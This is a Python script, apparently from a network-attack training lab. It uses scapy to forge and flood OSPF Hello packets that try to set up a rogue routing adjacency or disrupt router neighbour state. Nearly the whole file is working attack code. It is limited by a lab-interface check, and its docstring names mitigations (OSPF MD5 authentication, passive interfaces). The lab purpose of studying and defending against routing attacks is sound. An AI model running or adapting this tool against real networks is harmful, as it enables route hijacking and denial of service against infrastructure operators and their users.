#!/usr/bin/env python3
"""FHRP/ROUTING: flood OSPF Hello packets attempting a rogue adjacency (or DoS
the neighbor state machine on real routers). Mitigation: OSPF MD5 auth +
passive-interface default (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, iface_mac  # noqa: E402


def build_hello(scapy_all, area, router_id, src):
    import scapy.contrib.ospf as ospf
    Ether, IP = scapy_all.Ether, scapy_all.IP
    hdr = ospf.OSPF_Hdr(version=2, type=1, src=router_id, area=area)
    hello = ospf.OSPF_Hello(mask="255.255.255.0", hellointerval=10, options=2,
                             prio=1, deadinterval=40, router=router_id, backup="0.0.0.0")
    # Pin the L2 source to the lab NIC's real MAC. This already forwarded (the
    # IP-multicast dst let scapy route-resolve a source), but that source was the
    # container's default-route iface (eth0) — route-dependent. Setting it
    # explicitly guarantees a valid, deterministic eth1 source. See
    # common.iface_mac().
    return Ether(src=src, dst="01:00:5e:00:00:05") / IP(dst="224.0.0.5", proto=89, src=router_id) / hdr / hello


def main():
    p = base_parser("OSPF rogue adjacency: flood forged Hello packets")
    p.add_argument("--area", type=int, default=0)
    p.add_argument("--router_id", default="9.9.9.9")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    src = iface_mac(args.iface)
    pkt = build_hello(scapy_all, args.area, args.router_id, src)
    if args.selftest:
        selftest_ok("ospf_rogue", "OSPF Hello len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_hello(scapy_all, args.area, args.router_id, src), iface=args.iface, verbose=0)
        status("SENT", "OSPF Hello #%d area=%d router-id=%s" % (n + 1, args.area, args.router_id))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

